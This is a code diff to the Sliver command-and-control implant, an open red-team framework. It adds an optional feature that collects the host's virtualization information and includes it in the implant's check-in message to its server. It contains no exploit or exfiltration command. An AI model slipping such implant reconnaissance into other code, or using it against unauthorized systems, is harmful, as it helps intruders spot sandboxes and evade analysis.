@@ -50,7 +50,9 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-
+	// {{ if .Config.CollectVirtualizationInfo }}
+	"github.com/bishopfox/sliver/implant/sliver/virtualization"
+	// {{end}}
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
 	"google.golang.org/protobuf/reflect/protoreflect"
@@ -700,6 +702,14 @@ func registerSliver() *sliverpb.Register {
 	log.Printf("Host Uuid: %s", uuid)
 	// {{end}}
 
+	var virt string
+
+	// {{ if .Config.CollectVirtualizationInfo }}
+	virt = virtualization.GetVirtualizationInfo()
+	// {{ else }}
+	virt = ""
+	// {{ end }}
+
 	return &sliverpb.Register{
 		Name:              consts.SliverName,
 		Hostname:          hostname,
@@ -716,5 +726,6 @@ func registerSliver() *sliverpb.Register {
 		ConfigID:          "{{ .Config.ID }}",
 		PeerID:            pivots.MyPeerID,
 		Locale:            locale.GetLocale(),
+		Virtualization:    virt,
 	}
 }
